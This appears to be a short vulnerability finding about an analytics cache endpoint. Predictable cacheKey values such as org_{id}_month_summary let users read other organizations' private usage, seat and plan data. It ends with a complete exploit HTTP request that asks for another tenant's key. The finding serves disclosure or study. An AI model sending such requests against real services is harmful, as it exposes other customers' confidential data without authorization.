diagnosis: The analytics cache endpoint allows clients to query QuickLRU using an arbitrary cacheKey query parameter. Because keys follow predictable structures like org_{id}_month_summary, users can supply keys of other organizations to inspect their private API consumption figures, seat counts, and plan usage.
exploit_request:
GET /api/metrics/cached-summary?cacheKey=org_comp_5012_summary HTTP/1.1
Host: monitor.cloudplatform.com
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Accept: application/json
